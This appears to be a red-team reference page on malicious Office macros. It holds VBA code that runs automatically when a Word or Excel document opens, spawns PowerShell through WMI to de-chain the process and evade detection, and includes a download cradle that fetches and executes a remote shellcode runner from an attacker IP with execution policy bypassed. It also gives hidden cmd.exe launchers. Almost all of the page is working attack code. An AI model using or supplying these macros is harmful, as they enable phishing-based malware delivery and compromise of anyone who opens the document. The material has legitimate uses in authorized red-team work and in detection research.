---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/execution/macro
---

# Macro

### WMI process creation to de-chain the PowerShell process.

```vba
Sub MyMacro()
  strArg = "powershell"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

<figure><img src="../../../.gitbook/assets/image (897).png" alt=""><figcaption></figcaption></figure>

### Using the PowerShell shellcode runner

We can update the PowerShell argument for the _**Create**_ method to include the entire download cradle and dechaining with WMI.

{% code overflow="wrap" %}
```vba
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.19.134/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (898).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (899).png" alt=""><figcaption></figcaption></figure>

### Simple Macro

```vba
'Word Document
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub

'Excel Document
Sub Workbook_open()
    MyMacro
End Sub

Private Sub Auto_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```
